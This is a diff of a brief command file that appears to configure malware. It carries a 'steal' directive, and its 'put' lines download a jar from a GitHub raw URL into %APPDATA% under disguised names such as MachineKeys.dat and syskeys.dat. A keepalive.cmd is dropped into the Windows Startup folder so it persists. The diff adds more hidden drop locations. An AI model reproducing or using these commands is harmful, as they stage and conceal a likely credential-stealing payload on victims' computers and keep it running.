@@ -1,5 +1,7 @@
 # my commands
 version: 1
 steal
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Edge\cache.dat
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Protect\syskeys.dat
+put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Windows\WER\ReportArchive\crash.dat
 put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/keepalive.cmd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keepalive.cmd
